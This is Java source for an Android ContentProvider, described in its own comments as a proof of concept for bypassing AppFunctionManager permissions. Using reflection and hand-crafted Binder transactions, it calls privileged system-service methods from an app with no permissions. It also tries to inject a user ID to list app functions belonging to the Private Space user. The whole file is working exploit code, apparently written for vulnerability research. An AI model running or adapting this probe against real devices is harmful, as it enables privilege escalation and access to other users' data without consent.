package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

/**
 * Focused AppFunctionManager permission bypass PoC.
 * Tests searchAppFunctions and registerAppFunction from zero-perm app.
 */
public class AppFuncProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});

        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});
        cursor.addRow(new Object[]{"pkg", getContext().getPackageName()});

        IBinder binder = getServiceBinder("app_function");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.app.appfunctions.IAppFunctionManager";

        // TX=4: registerAppFunction
        // Signature: registerAppFunction(AppFunctionAidlRegistration reg, IAppFunctionEnabledCallback cb)
        testRegisterAppFunction(binder, desc, cursor);

        // TX=5: searchAppFunctions - enumerate all registered app functions
        // Signature: searchAppFunctions(AppFunctionAidlSearchSpec spec, ISearchAppFunctionsCallback cb)
        testSearchAppFunctions(binder, desc, cursor);

        // TX=6: setAppFunctionEnabled
        // Signature: setAppFunctionEnabled(String pkg, String funcId, boolean enabled, IAppFunctionEnabledCallback cb)
        testSetAppFunctionEnabled(binder, desc, cursor);

        // TX=7: setAppFunctionsPolicy - requires callingPackage match
        testSetAppFunctionsPolicy(binder, desc, cursor);

        // Now test cross-user: try to search functions for user 11
        testSearchAppFunctionsCrossUser(binder, desc, cursor);

        return cursor;
    }

    private void testRegisterAppFunction(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // AppFunctionAidlRegistration parcelable (non-null marker + minimal fields)
            data.writeInt(1); // non-null
            data.writeString("com.poc.crossuser"); // packageName
            data.writeString("test_function_id"); // functionId
            data.writeInt(1); // enabled
            // IAppFunctionEnabledCallback binder
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.IAppFunctionEnabledCallback"));
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"registerAppFunction_TX4", "SUCCESS_NO_PERM_CHECK"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"registerAppFunction_TX4", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"registerAppFunction_TX4", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSearchAppFunctions(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // AppFunctionAidlSearchSpec parcelable
            data.writeInt(1); // non-null
            // Search spec fields - try to enumerate all functions
            data.writeString("*"); // searchExpression
            data.writeInt(1000); // maxResultCount
            data.writeString(getContext().getPackageName()); // callingPackage
            // ISearchAppFunctionsCallback
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.ISearchAppFunctionsCallback"));
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"searchAppFunctions_TX5", "SUCCESS_NO_PERM_CHECK"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"searchAppFunctions_TX5", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"searchAppFunctions_TX5", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSetAppFunctionEnabled(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // String packageName
            data.writeString("com.poc.crossuser");
            // String functionId
            data.writeString("test_function");
            // boolean enabled
            data.writeInt(1);
            // IAppFunctionEnabledCallback
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.IAppFunctionEnabledCallback"));
            binder.transact(6, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"setAppFunctionEnabled_TX6", "SUCCESS_NO_PERM_CHECK"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"setAppFunctionEnabled_TX6", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"setAppFunctionEnabled_TX6", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSetAppFunctionsPolicy(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName()); // callingPackage
            data.writeInt(0); // policy flags
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"setAppFunctionsPolicy_TX7", "SUCCESS"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"setAppFunctionsPolicy_TX7", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"setAppFunctionsPolicy_TX7", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSearchAppFunctionsCrossUser(IBinder binder, String desc, MatrixCursor cursor) {
        // Test: Can we search app functions registered by user 11 (Private Space)?
        // The AppFunction service internally calls handleIncomingUser
        // If it doesn't properly validate, we might see cross-user data
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(1); // non-null search spec
            data.writeString("*"); // query all
            data.writeInt(1000); // max results
            // Try passing user 11's package context
            data.writeString("com.google.android.apps.photos"); // target a likely-installed app
            data.writeInt(11); // try injecting userId
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.ISearchAppFunctionsCallback"));
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"searchAppFunctions_crossuser_u11", "SUCCESS"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"searchAppFunctions_crossuser_u11", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"searchAppFunctions_crossuser_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String desc) { this.descriptor = desc; attachInterface(null, desc); }
        @Override public String getInterfaceDescriptor() { return descriptor; }
        @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
